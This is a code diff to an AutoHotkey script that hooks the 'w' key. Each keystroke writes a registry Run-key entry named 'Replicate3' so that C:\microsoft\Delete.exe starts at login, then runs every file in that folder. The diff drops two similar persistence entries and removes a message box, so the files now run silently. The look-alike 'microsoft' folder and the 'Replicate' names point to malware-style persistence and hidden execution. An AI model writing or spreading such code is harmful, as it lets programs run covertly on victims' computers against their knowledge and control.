@@ -13,12 +13,9 @@ DirList(pattern, attr := "") {
 $w::{
     path := "C:\microsoft"
     Send "w"
-    RegWrite '"C:\microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
-    RegWrite '"C:\microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
     RegWrite '"C:\microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
     if (DirExist(path)) {
         for file in DirList(path "\*") {
-            MsgBox file
             Run file
         }
     } else {
